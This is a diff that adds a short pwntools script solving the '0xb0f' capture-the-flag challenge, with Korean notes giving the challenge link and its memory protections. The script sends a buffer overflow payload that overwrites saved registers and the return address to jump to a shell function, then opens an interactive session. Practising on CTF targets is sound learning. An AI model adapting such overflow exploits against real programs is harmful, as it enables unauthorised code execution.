@@ -1,0 +1,22 @@
+from pwn import *
+
+p = process("./0xb0f", {"LD_PRELOAD":"./libc-2.27.so"})
+# p = remote("pwn.pwnme.fr", 7007)
+
+table = 0x804a000
+shell = 0x8048659
+
+payload = b'A'*0xe          # buffer[:0xe]
+payload += p32(table)       # ebx
+payload += p32(0)           # sfp
+payload += p32(shell)       # shell
+
+p.sendlineafter(":", payload)
+
+p.interactive()
+
+B0f
+
+문제 링크 : https://ctf.pwnme.fr/challenges#0xb0f-34
+
+메모리 보호 기법 : Nx bit, RELRO : PARTIAL
